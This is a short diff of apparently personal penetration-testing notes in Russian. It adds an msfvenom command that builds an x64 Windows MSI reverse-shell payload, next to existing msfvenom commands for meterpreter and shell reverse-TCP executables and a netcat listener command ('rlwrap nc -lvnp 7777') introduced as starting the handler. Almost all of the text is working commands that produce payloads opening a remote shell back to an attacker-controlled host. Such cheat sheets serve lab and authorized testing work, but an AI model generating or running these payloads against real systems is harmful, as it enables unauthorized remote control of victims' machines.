@@ -7,6 +7,12 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f e
 проверено для netcat и для метасплойт
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.18.35.17 LPORT=7777 -f exe -o Zero.exe
+
+msfvenom –platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.28 LPORT=4444 -f msi -o tmp/rev.msi
+
+
+
+Включаем хендлер
 rlwrap nc -lvnp 7777
 
 вместо неткат для метасплойт
